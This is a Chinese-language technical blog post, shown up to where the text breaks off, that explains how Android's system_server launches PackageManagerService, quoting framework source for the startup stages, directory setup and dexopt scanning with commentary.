<h1 id="一、system-server启动PMS"><a href="#一、system-server启动PMS" class="headerlink" title="一、system_server启动PMS"></a>一、system_server启动PMS</h1><p>Android的所有Java服务都是通过<code>system_server</code>进程启动的，并且驻留在<code>system_server</code>进程中。SystemServer进程在启动时，通过创建一个<code>ServerThread</code>线程来启动所有服务，现在先来看看Android服务中<code>PackageManagerService</code>服务启动过程。</p>
<blockquote>
<p>/frameworks/base/services/java/com/android/server/SystemServer.java</p>
</blockquote>
<h2 id="1-1-startBootstrapServices"><a href="#1-1-startBootstrapServices" class="headerlink" title="1.1 startBootstrapServices()"></a>1.1 startBootstrapServices()</h2><p>system_server的<strong><code>startBootstrapServices()</code></strong>函数会启动一些引导服务，该方法所创建的服务：</p>
<ul>
<li>ActivityManagerService, </li>
<li>PowerManagerService, </li>
<li>LightsService, </li>
<li>DisplayManagerService， </li>
<li><code>PackageManagerService</code>，</li>
<li>UserManagerService， </li>
<li>SensorService服务。</li>
</ul>
<p>其中我们需要的PackageManagerService就在这里启动，我们来看看startBootstrapServices()是如何启动PMS的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">startBootstrapServices</span><span class="params">()</span> </span>&#123;</div><div class="line"></div><div class="line">        <span class="comment">//启动installer服务</span></div><div class="line">        Installer installer = mSystemServiceManager.startService(Installer.class);</div><div class="line"></div><div class="line">        <span class="comment">// We need the default display before we can initialize the package manager.</span></div><div class="line">        mSystemServiceManager.startBootPhase(SystemService.PHASE_WAIT_FOR_DEFAULT_DISPLAY);</div><div class="line">        </div><div class="line">        <span class="comment">//处于加密状态则仅仅解析核心应用</span></div><div class="line">        <span class="comment">// Only run "core" apps if we're encrypting the device.</span></div><div class="line">        String cryptState = SystemProperties.get(<span class="string">"vold.decrypt"</span>);</div><div class="line">        <span class="keyword">if</span> (ENCRYPTING_STATE.equals(cryptState)) &#123;</div><div class="line">            Slog.w(TAG, <span class="string">"Detected encryption in progress - only parsing core apps"</span>);</div><div class="line">            mOnlyCore = <span class="keyword">true</span>;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ENCRYPTED_STATE.equals(cryptState)) &#123;</div><div class="line">            Slog.w(TAG, <span class="string">"Device encrypted - only parsing core apps"</span>);</div><div class="line">            mOnlyCore = <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// 创建PMS对象 - 启动入口</span></div><div class="line">        traceBeginAndSlog(<span class="string">"StartPackageManagerService"</span>);</div><div class="line">        mPackageManagerService = PackageManagerService.main(mSystemContext, installer,</div><div class="line">                mFactoryTestMode != FactoryTest.FACTORY_TEST_OFF, mOnlyCore);</div><div class="line">        <span class="comment">// 是否首次启动</span></div><div class="line">        mFirstBoot = mPackageManagerService.isFirstBoot();</div><div class="line">        </div><div class="line">        <span class="comment">// 获取PackageManager</span></div><div class="line">        mPackageManager = mSystemContext.getPackageManager();</div><div class="line">        Trace.traceEnd(Trace.TRACE_TAG_SYSTEM_SERVER);</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1-2-startOtherServices"><a href="#1-2-startOtherServices" class="headerlink" title="1.2 startOtherServices()"></a>1.2 startOtherServices()</h2><p>另外，system_server的<code>startOtherServices()</code>方法会启动其他服务，这个函数也会对PMS作一些操作：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">startOtherServices</span><span class="params">()</span> </span>&#123;</div><div class="line">    ......</div><div class="line">    <span class="keyword">if</span> (!mOnlyCore) &#123;</div><div class="line">        ........</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            <span class="comment">//将调用performDexOpt:Performs dexopt on the set of packages</span></div><div class="line">            mPackageManagerService.updatePackagesIfNeeded();</div><div class="line">        &#125;.......</div><div class="line">        ........</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            <span class="comment">//执行Fstrim，执行磁盘维护操作，未看到详细的资料</span></div><div class="line">            <span class="comment">//可能类似于TRIM技术，将标记为删除的文件，彻底从硬盘上移除</span></div><div class="line">            <span class="comment">//而不是等到写入时再移除，目的是提高写入时效率</span></div><div class="line">            mPackageManagerService.performFstrimIfNeeded();</div><div class="line">        &#125;.........</div><div class="line">        .......</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            mPackageManagerService.systemReady();</div><div class="line">        &#125;........</div><div class="line">        .......</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>从上面的代码可以看出，PMS启动后将参与一些系统优化的工作，然后调用SystemReady函数通知系统进入就绪状态。</p>
<p>整个system_server进程启动过程，涉及PMS服务的主要几个动作如下:</p>
<ul>
<li>PMS.main()</li>
<li>PMS.performDexOpt()</li>
<li>PMS.systemReady()</li>
</ul>
<p>本文主要介绍PMS.main()流程，即PackageManagerService启动流程。</p>
<h1 id="二、PMS-main入口"><a href="#二、PMS-main入口" class="headerlink" title="二、PMS.main入口"></a>二、PMS.main入口</h1><p>PackageManagerService.main过程主要是创建PMS服务，并注册到ServiceManager大管家：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> PackageManagerService <span class="title">main</span><span class="params">(Context context, Installer installer,</span></span></div><div class="line">            <span class="keyword">boolean</span> factoryTest, <span class="keyword">boolean</span> onlyCore) &#123;</div><div class="line">        <span class="comment">// Self-check for initial settings.</span></div><div class="line">        PackageManagerServiceCompilerMapping.checkProperties();</div><div class="line"></div><div class="line">        <span class="comment">// 创建PMS对象</span></div><div class="line">        PackageManagerService m = <span class="keyword">new</span> PackageManagerService(context, installer,</div><div class="line">                factoryTest, onlyCore);</div><div class="line">        m.enableSystemUserPackages();</div><div class="line">        <span class="comment">// Disable any carrier apps. We do this very early in boot to prevent the apps from being</span></div><div class="line">        <span class="comment">// disabled after already being started.</span></div><div class="line">        CarrierAppUtils.disableCarrierAppsUntilPrivileged(context.getOpPackageName(), m,</div><div class="line">                UserHandle.USER_SYSTEM);</div><div class="line">        </div><div class="line">        <span class="comment">// 添加到ServiceManager</span></div><div class="line">        ServiceManager.addService(<span class="string">"package"</span>, m);</div><div class="line">        <span class="keyword">return</span> m;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="三、PMS构造函数-分析"><a href="#三、PMS构造函数-分析" class="headerlink" title="三、PMS构造函数 - 分析"></a>三、PMS构造函数 - 分析</h1><blockquote>
<p>new PackageManagerService(context, installer, factoryTest, onlyCore);</p>
</blockquote>
<p>创建PMS对象的过程，就是执行PMS的构造函数，PMS构造函数比较长，我们把这个过程分成几个阶段：</p>
<ul>
<li>BOOT_PROGRESS_PMS_START,</li>
<li>BOOT_PROGRESS_PMS_SYSTEM_SCAN_START,</li>
<li>BOOT_PROGRESS_PMS_DATA_SCAN_START,</li>
<li>BOOT_PROGRESS_PMS_SCAN_END,</li>
<li>BOOT_PROGRESS_PMS_READY,</li>
</ul>
<p>PMS构造函数里面，在每个阶段开始的时候，都会往<code>Eventlog</code>里面打Tag，比如像这样：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EventLog.writeEvent(EventLogTags.BOOT_PROGRESS_PMS_START, SystemClock.uptimeMillis());</div></pre></td></tr></table></figure>
<p>接下来分别说说这几个阶段。</p>
<h2 id="3-1-PMS-START"><a href="#3-1-PMS-START" class="headerlink" title="3.1 PMS_START"></a>3.1 PMS_START</h2><p>BOOT_PROGRESS_PMS_START阶段：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 输出event log</span></div><div class="line">EventLog.writeEvent(EventLogTags.BOOT_PROGRESS_PMS_START,</div><div class="line">        SystemClock.uptimeMillis());</div><div class="line"></div><div class="line"><span class="comment">/** M: Mtprof tool @&#123; */</span></div><div class="line"><span class="comment">//mMTPROFDisable = "1".equals(SystemProperties.get("ro.mtprof.disable"));</span></div><div class="line">mMTPROFDisable = <span class="keyword">false</span>;</div><div class="line">addBootEvent(<span class="string">"Android:PackageManagerService_Start"</span>);</div><div class="line"><span class="comment">/** @&#125; */</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (mSdkVersion &lt;= <span class="number">0</span>) &#123;</div><div class="line">    Slog.w(TAG, <span class="string">"**** ro.build.version.sdk not set!"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">mContext = context;</div><div class="line">mFactoryTest = factoryTest;</div><div class="line">mOnlyCore = onlyCore;</div><div class="line"></div><div class="line"><span class="comment">// DisplayMetrics是一个描述界面显示，尺寸，分辨率，密度的类。</span></div><div class="line">mMetrics = <span class="keyword">new</span> DisplayMetrics();</div><div class="line"></div><div class="line"><span class="comment">// Settings是Android的全局管理者，用于协助PMS保存所有的安装包信息</span></div><div class="line">mSettings = <span class="keyword">new</span> Settings(mPackages);</div><div class="line">mSettings.addSharedUserLPw(<span class="string">"android.uid.system"</span>, Process.SYSTEM_UID,</div><div class="line">        ApplicationInfo.FLAG_SYSTEM, ApplicationInfo.PRIVATE_FLAG_PRIVILEGED);</div><div class="line">mSettings.addSharedUserLPw(<span class="string">"android.uid.phone"</span>, RADIO_UID,</div><div class="line">        ApplicationInfo.FLAG_SYSTEM, ApplicationInfo.PRIVATE_FLAG_PRIVILEGED);</div><div class="line">mSettings.addSharedUserLPw(<span class="string">"android.uid.log"</span>, LOG_UID,</div><div class="line">        ApplicationInfo.FLAG_SYSTEM, ApplicationInfo.PRIVATE_FLAG_PRIVILEGED);</div><div class="line">mSettings.addSharedUserLPw(<span class="string">"android.uid.nfc"</span>, NFC_UID,</div><div class="line">        ApplicationInfo.FLAG_SYSTEM, ApplicationInfo.PRIVATE_FLAG_PRIVILEGED);</div><div class="line">mSettings.addSharedUserLPw(<span class="string">"android.uid.bluetooth"</span>, BLUETOOTH_UID,</div><div class="line">        ApplicationInfo.FLAG_SYSTEM, ApplicationInfo.PRIVATE_FLAG_PRIVILEGED);</div><div class="line">mSettings.addSharedUserLPw(<span class="string">"android.uid.shell"</span>, SHELL_UID,</div><div class="line">        ApplicationInfo.FLAG_SYSTEM, ApplicationInfo.PRIVATE_FLAG_PRIVILEGED);</div><div class="line"></div><div class="line"><span class="comment">// 获取debug.separate_processes属性</span></div><div class="line"><span class="comment">// 如果设置了这个属性，那么会强制应用程序组件在自己的进程中运行。</span></div><div class="line"><span class="comment">// 一般情况下不会设置这个属性</span></div><div class="line">String separateProcesses = SystemProperties.get(<span class="string">"debug.separate_processes"</span>);</div><div class="line"><span class="keyword">if</span> (separateProcesses != <span class="keyword">null</span> &amp;&amp; separateProcesses.length() &gt; <span class="number">0</span>) &#123;</div><div class="line">    <span class="comment">// 所有process都设置这个属性</span></div><div class="line">    <span class="keyword">if</span> (<span class="string">"*"</span>.equals(separateProcesses)) &#123;</div><div class="line">        mDefParseFlags = PackageParser.PARSE_IGNORE_PROCESSES;</div><div class="line">        mSeparateProcesses = <span class="keyword">null</span>;</div><div class="line">        Slog.w(TAG, <span class="string">"Running with debug.separate_processes: * (ALL)"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// 个别的process设置这个属性 </span></div><div class="line">    <span class="keyword">else</span> &#123;</div><div class="line">        mDefParseFlags = <span class="number">0</span>;</div><div class="line">        mSeparateProcesses = separateProcesses.split(<span class="string">","</span>);</div><div class="line">        Slog.w(TAG, <span class="string">"Running with debug.separate_processes: "</span></div><div class="line">                + separateProcesses);</div><div class="line">    &#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 不设置这个属性,一般情况下会走这</span></div><div class="line">    mDefParseFlags = <span class="number">0</span>;</div><div class="line">    mSeparateProcesses = <span class="keyword">null</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 保存Installer对象</span></div><div class="line">mInstaller = installer;</div><div class="line"></div><div class="line"><span class="comment">// //用于dex优化</span></div><div class="line">mPackageDexOptimizer = <span class="keyword">new</span> PackageDexOptimizer(installer, mInstallLock, context,</div><div class="line">        <span class="string">"*dexopt*"</span>);</div><div class="line">mMoveCallbacks = <span class="keyword">new</span> MoveCallbacks(FgThread.get().getLooper());</div><div class="line"></div><div class="line">mOnPermissionChangeListeners = <span class="keyword">new</span> OnPermissionChangeListeners(</div><div class="line">        FgThread.get().getLooper());</div><div class="line"></div><div class="line"><span class="comment">// 获取默认的显示信息，保存到mMetrics</span></div><div class="line">getDefaultDisplayMetrics(context, mMetrics);</div><div class="line"></div><div class="line"><span class="comment">// 获取系统配置信息</span></div><div class="line">SystemConfig systemConfig = SystemConfig.getInstance();</div><div class="line">mGlobalGids = systemConfig.getGlobalGids();</div><div class="line">mSystemPermissions = systemConfig.getSystemPermissions();</div><div class="line">mAvailableFeatures = systemConfig.getAvailableFeatures();</div><div class="line"></div><div class="line"><span class="keyword">synchronized</span> (mInstallLock) &#123;</div><div class="line"><span class="comment">// writer</span></div><div class="line"><span class="keyword">synchronized</span> (mPackages) &#123;</div><div class="line"></div><div class="line">    <span class="comment">//创建名为“PackageManager”的handler线程</span></div><div class="line">    mHandlerThread = <span class="keyword">new</span> ServiceThread(TAG,</div><div class="line">            Process.THREAD_PRIORITY_BACKGROUND, <span class="keyword">true</span> <span class="comment">/*allowIo*/</span>);</div><div class="line">    mHandlerThread.start();</div><div class="line">    </div><div class="line">    <span class="comment">// 建立PackageHandler消息循环，用于处理外部的安装请求等消息</span></div><div class="line">    <span class="comment">// 比如如adb install、packageinstaller安装APK时</span></div><div class="line">    mHandler = <span class="keyword">new</span> PackageHandler(mHandlerThread.getLooper());</div><div class="line">    mProcessLoggingHandler = <span class="keyword">new</span> ProcessLoggingHandler();</div><div class="line">    Watchdog.getInstance().addThread(mHandler, WATCHDOG_TIMEOUT);</div><div class="line"></div><div class="line">    <span class="comment">// 创建各种目录</span></div><div class="line">    File dataDir = Environment.getDataDirectory();</div><div class="line">    mAppInstallDir = <span class="keyword">new</span> File(dataDir, <span class="string">"app"</span>);</div><div class="line">    mAppLib32InstallDir = <span class="keyword">new</span> File(dataDir, <span class="string">"app-lib"</span>);</div><div class="line">    mEphemeralInstallDir = <span class="keyword">new</span> File(dataDir, <span class="string">"app-ephemeral"</span>);</div><div class="line">    mAsecInternalPath = <span class="keyword">new</span> File(dataDir, <span class="string">"app-asec"</span>).getPath();</div><div class="line">    mDrmAppPrivateInstallDir = <span class="keyword">new</span> File(dataDir, <span class="string">"app-private"</span>);</div><div class="line"></div><div class="line">    <span class="comment">// 创建用户管理服务</span></div><div class="line">    sUserManager = <span class="keyword">new</span> UserManagerService(context, <span class="keyword">this</span>, mPackages);</div><div class="line"></div><div class="line">    <span class="comment">// Propagate permission configuration in to package manager.</span></div><div class="line">    ArrayMap&lt;String, SystemConfig.PermissionEntry&gt; permConfig</div><div class="line">            = systemConfig.getPermissions();</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;permConfig.size(); i++) &#123;</div><div class="line">        SystemConfig.PermissionEntry perm = permConfig.valueAt(i);</div><div class="line">        BasePermission bp = mSettings.mPermissions.get(perm.name);</div><div class="line">        <span class="keyword">if</span> (bp == <span class="keyword">null</span>) &#123;</div><div class="line">            bp = <span class="keyword">new</span> BasePermission(perm.name, <span class="string">"android"</span>, BasePermission.TYPE_BUILTIN);</div><div class="line">            mSettings.mPermissions.put(perm.name, bp);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (perm.gids != <span class="keyword">null</span>) &#123;</div><div class="line">            bp.setGids(perm.gids, perm.perUser);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 获取共享库</span></div><div class="line">    ArrayMap&lt;String, String&gt; libConfig = systemConfig.getSharedLibraries();</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;libConfig.size(); i++) &#123;</div><div class="line">        mSharedLibraries.put(libConfig.keyAt(i),</div><div class="line">                <span class="keyword">new</span> SharedLibraryEntry(libConfig.valueAt(i), <span class="keyword">null</span>));</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    mFoundPolicyFile = SELinuxMMAC.readInstallPolicy();</div><div class="line"></div><div class="line">    <span class="comment">// 解析packages.xml和packages-backup.xml</span></div><div class="line">    mRestoredSettings = mSettings.readLPw(sUserManager.getUsers(<span class="keyword">false</span>));</div><div class="line"></div><div class="line">    ...</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>我们再来总结PMS_START阶段都做了什么：</p>
<p><strong>总结阶段一主要工作如下：</strong></p>
<ul>
<li>构造DisplayMetrics类：描述界面显示，尺寸，分辨率，密度。构造完后并获取默认的信息保存到变量mMetrics中。</li>
<li>构造Settings类：这个是Android的全局管理者，用于协助PMS保存所有的安装包信息</li>
<li>保存Installer对象</li>
<li>获取系统配置信息：SystemConfig构造函数中会通过<code>readPermissions()</code>解析指定目录下的所有xml文件,然后把这些信息保存到systemConfig中，涉及的目录有如下：<ul>
<li>/system/etc/sysconfig</li>
<li>/system/etc/permissions</li>
<li>/oem/etc/sysconfig</li>
<li>/oem/etc/permissions</li>
</ul>
</li>
<li>创建名为PackageManager的handler线程，建立PackageHandler消息循环，用于处理外部的安装请求等消息</li>
<li>创建data下的各种目录，比如data/app, data/app-private等。</li>
<li>创建用户管理服务UserManagerService</li>
<li>把systemConfig关于xml中的<library>标签所指的动态库保存到mSharedLibraries</library></li>
<li>Settings.readLPw扫描解析packages.xml和packages-backup.xml</li>
</ul>
<p>补充说明下<strong>debug.separate_processes</strong>这个属性：<br>这个属性你可以使用强制应用程序组件在自己的进程中运行，有两种方法可以使用这个：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">// 所有的进程都会受到影响</div><div class="line">setprop debug.separate_processes </div><div class="line">// 指定进程受影响</div><div class="line">setprop debug.separate_processes“com.google.process.content, com.google.android.samples”</div></pre></td></tr></table></figure>
<p>这个属性一般不会用到。</p>
<h2 id="3-2-PMS-SYSTEM-SCAN-START"><a href="#3-2-PMS-SYSTEM-SCAN-START" class="headerlink" title="3.2 PMS_SYSTEM_SCAN_START"></a>3.2 PMS_SYSTEM_SCAN_START</h2><p>接下来是BOOT_PROGRESS_PMS_SYSTEM_SCAN_START阶段：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">long</span> startTime = SystemClock.uptimeMillis();</div><div class="line">EventLog.writeEvent(EventLogTags.BOOT_PROGRESS_PMS_SYSTEM_SCAN_START,</div><div class="line">        startTime);</div><div class="line"></div><div class="line"><span class="keyword">final</span> <span class="keyword">int</span> scanFlags = SCAN_NO_PATHS | SCAN_DEFER_DEX | SCAN_BOOTING | SCAN_INITIAL;</div><div class="line"><span class="comment">//该集合中存放的是已经优化或者不需要优先的文件</span></div><div class="line"><span class="keyword">final</span> ArraySet&lt;String&gt; alreadyDexOpted = <span class="keyword">new</span> ArraySet&lt;String&gt;();</div><div class="line"></div><div class="line"><span class="keyword">final</span> String bootClassPath = System.getenv(<span class="string">"BOOTCLASSPATH"</span>);</div><div class="line"><span class="keyword">final</span> String systemServerClassPath = System.getenv(<span class="string">"SYSTEMSERVERCLASSPATH"</span>);</div><div class="line"></div><div class="line"><span class="comment">//将环境变量BOOTCLASSPATH所执行的文件加入alreadyDexOpted</span></div><div class="line"><span class="keyword">if</span> (bootClassPath != <span class="keyword">null</span>) &#123;</div><div class="line">    String[] bootClassPathElements = splitString(bootClassPath, <span class="string">':'</span>);</div><div class="line">    <span class="keyword">for</span> (String element : bootClassPathElements) &#123;</div><div class="line">        alreadyDexOpted.add(element);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//将环境变量SYSTEMSERVERCLASSPATH所执行的文件加入alreadyDexOpted</span></div><div class="line"><span class="keyword">if</span> (systemServerClassPath != <span class="keyword">null</span>) &#123;</div><div class="line">    String[] systemServerClassPathElements = splitString(systemServerClassPath, <span class="string">':'</span>);</div><div class="line">    <span class="keyword">for</span> (String element : systemServerClassPathElements) &#123;</div><div class="line">        alreadyDexOpted.add(element);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">...</div><div class="line"></div><div class="line"><span class="comment">//此处共享库是由SystemConfig实例化过程赋值的</span></div><div class="line"><span class="keyword">if</span> (mSharedLibraries.size() &gt; <span class="number">0</span>) &#123;</div><div class="line">    <span class="keyword">for</span> (String dexCodeInstructionSet : dexCodeInstructionSets) &#123;</div><div class="line">        <span class="keyword">for</span> (SharedLibraryEntry libEntry : mSharedLibraries.values()) &#123;</div><div class="line">            <span class="keyword">final</span> String lib = libEntry.path;</div><div class="line">            ...</div><div class="line">            <span class="keyword">int</span> dexoptNeeded = DexFile.getDexOptNeeded(lib, dexCodeInstructionSet,</div><div class="line">                    <span class="string">"speed"</span>, <span class="keyword">false</span>);</div><div class="line">            <span class="keyword">if</span> (dexoptNeeded != DexFile.NO_DEXOPT_NEEDED) &#123;</div><div class="line">                alreadyDexOpted.add(lib);</div><div class="line">                <span class="comment">//执行dexopt操作</span></div><div class="line">                mInstaller.dexopt(lib, Process.SYSTEM_UID, dexCodeInstructionSet,</div><div class="line">                        dexoptNeeded, DEXOPT_PUBLIC <span class="comment">/*dexFlags*/</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//此处frameworkDir目录为/system/framework</span></div><div class="line">File frameworkDir = <span class="keyword">new</span> File(Environment.getRootDirectory(), <span class="string">"framework"</span>);</div><div class="line"></div><div class="line"><span class="comment">//添加以下两个文件添加到已优化集合</span></div><div class="line">alreadyDexOpted.add(frameworkDir.getPath() + <span class="string">"/framework-res.apk"</span>);</div><div class="line">alreadyDexOpted.add(frameworkDir.getPath() + <span class="string">"/core-libart.jar"</span>);</div><div class="line"></div><div class="line">String[] frameworkFiles = frameworkDir.list();</div><div class="line"><span class="keyword">if</span> (frameworkFiles != <span class="keyword">null</span>) &#123;</div><div class="line">    <span class="keyword">for</span> (String dexCodeInstructionSet : dexCodeInstructionSets) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;frameworkFiles.length; i++) &#123;</div><div class="line">            File libPath = <span class="keyword">new</span> File(frameworkDir, frameworkFiles[i]);</div><div class="line">            String path = libPath.getPath();</div><div class="line">            <span class="comment">//跳过已优化集合中的文件</span></div><div class="line">            <span class="keyword">if</span> (alreadyDexOpted.contains(path)) 